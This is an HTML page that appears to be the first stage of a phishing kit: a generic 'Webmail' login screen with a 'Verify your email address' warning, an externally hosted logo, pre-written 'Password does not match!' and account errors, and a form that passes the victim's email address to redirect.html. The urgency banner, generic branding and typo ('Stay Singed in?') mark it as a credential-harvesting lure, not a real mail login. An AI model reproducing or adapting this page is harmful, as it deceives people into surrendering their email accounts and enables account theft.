<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Mail</title>
  
  <!-- Bootstrap CSS -->
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
  <link rel="stylesheet" href="css/font-awesome-4.7.0/css/font-awesome.min.css">
  <!-- Font Awesome for icon -->
  <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
  
  <style>
    .login-form {
      width: 385px;
      margin: 30px auto;
    }
    .login-form form {
      margin-bottom: 15px;
      background: #f7f7f7;
      box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
      padding: 30px;
    }
    .login-form h2 {
      margin: 0 0 15px;
    }
    .form-control, .login-btn {
      min-height: 38px;
      border-radius: 2px;
    }
    .login-btn {
      font-size: 15px;
      font-weight: bold;
    }
  </style>
</head>
<body>

<div class="login-form">
  <form action="redirect.html" method="GET" onsubmit="handleSubmit(event)">
    <h2 class="text-center">
      <div id="top"> 
        <img src="https://i.ibb.co/MyxYvzr3/download.jpg" alt="Mailbox" id="logoimg" style="width:38px;height:38px;">
        
            <span class="logoname" style="vertical-align: middle; padding-left: 5px;">Webmail</span>
    <br>
     </div>
    </h2>
<div style="background-color: #fff3cd; border: 1px solid #ffeeba; color: #856404; padding: 15px; border-radius: 5px; display: flex; align-items: center; font-family: Arial, sans-serif; max-width: 400px; box-shadow: 0 2px 6px rgba(0,0,0,0.1);">
  <svg xmlns="http://www.w3.org/2000/svg" style="flex-shrink: 0; width: 24px; height: 24px; margin-right: 10px;" fill="currentColor" class="bi bi-exclamation-triangle-fill" viewBox="0 0 16 16">
    <path d="M8.982 1.566a1.13 1.13 0 0 0-1.964 0L.165 13.233c-.457.778.091 1.767.982 1.767h13.707c.89 0 1.438-.99.982-1.767L8.982 1.566zm-.982 4.434a.905.905 0 1 1 1.81 0l-.35 3.5a.552.552 0 0 1-1.11 0l-.35-3.5zM8 12.5a1 1 0 1 1 0-2 1 1 0 0 1 0 2z"/>
  </svg>
  <div>

    Verify your email address
  </div>
</div><br>

    <center>
      <div class="alert alert-danger" id="msg" style="display: none;">Password does not match!</div>
      <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
    </center>

    <div class="form-group">
      <div class="input-group">
        <div class="input-group-prepend">
          <span class="input-group-text"><i class="fa fa-user"></i></span>
        </div>
        <input type="email" class="form-control" name="email" placeholder="Email address" id="email" required>
      </div><br>
          <div>
      <label class="pull-left checkbox-inline"><input type="checkbox"> Stay Singed in?</label>
      <a href="#" class="pull-right">Forgot your email?</a>
    </div>
      <button type="submit" class="btn btn-primary login-btn btn-block" id="submit-btn" disabled>Next</button>
    </div>


  </form>

  <p class="text-center">
    <a href="#">Copyright &copy; <span class="logoname">2025</span></a>
  </p>
</div>

<!-- jQuery -->
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<script>
  const emailInput = document.getElementById('email');
  const submitBtn = document.getElementById('submit-btn');

  emailInput.addEventListener('input', function () {
    submitBtn.disabled = emailInput.value.trim() === '';
  });

  function handleSubmit(event) {
    const btn = document.getElementById('submit-btn');
    btn.innerText = 'Loading...';
  }
</script>

</body>
</html>
